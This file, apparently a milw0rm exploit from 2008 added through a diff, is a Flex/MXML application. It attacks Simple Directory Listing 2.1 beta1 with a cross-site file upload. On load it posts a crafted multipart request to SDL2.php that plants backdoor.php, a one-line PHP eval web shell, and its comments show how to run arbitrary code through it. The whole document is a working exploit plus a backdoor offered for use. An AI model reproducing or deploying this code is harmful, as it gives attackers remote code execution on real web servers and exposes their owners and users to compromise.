@@ -1,0 +1,38 @@
+Simple Directory Listing 2 - Cross Site File Upload
+--------------------------------------------------------------------------------
+<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" creationComplete="onAppInit()">
+	<mx:Script>
+		/*  
+			Written by Michael Brooks
+			
+			VUlerablity type: Cross Site File Upload.
+			Affects: SDL 2.1 beta1
+			Product homepage: http://simpledirectorylisting.net/
+			
+			SDL has 22+ million downloads from sourceforge.net!
+			The top three php projects where hacked in one day using . 
+			 
+			Exploit built using Flex 3.2 (http://www.adobe.com/go/flex_trial)
+			uploads ./backdoor.php in the same directory as SDL2.php
+			Backdoor Useage:
+			http://10.1.1.155/backdoor.php?e=phpinfo();
+			backdoor code:
+			<?php eval($_GET[e])?>
+			
+			More info on Cross Site File Upload Attacks:
+			http://www.gnucitizen.org/blog/cross-site-file-upload-attacks/
+			Inspired by the work of Petko D. Petkov; pdp
+		 * GNUCITIZEN
+		 **/
+		import flash.net.*;
+		private function onAppInit():void{
+			var request:URLRequest = new URLRequest("http://10.1.1.155/SDL2.php?action=module&amp;module=ModuleUpload&amp;moduleParams[action]=upload&amp;moduleParams[cwdRelPath]=");	
+			request.requestHeaders.push(new URLRequestHeader('Content-Type', 'multipart/form-data; boundary=---------------------------109092118919201'));       
+		 	request.data = unescape('-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22file%22%3B filename%3D%22backdoor.php%22%0D%0AContent-Type%3A text%2Fplain%0D%0A%0D%0A%3C%3Fphp eval%28stripslashes%28%24_GET%5Be%5D%29%29%3F%3E%0D%0A-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22upload%22%0D%0A%0D%0AUpload%0D%0A-----------------------------109092118919201--%0A');
+			request.method = URLRequestMethod.POST;
+		    navigateToURL(request, '_self');	
+		}
+	</mx:Script>
+</mx:Application>
+
+# milw0rm.com [2008-12-08]
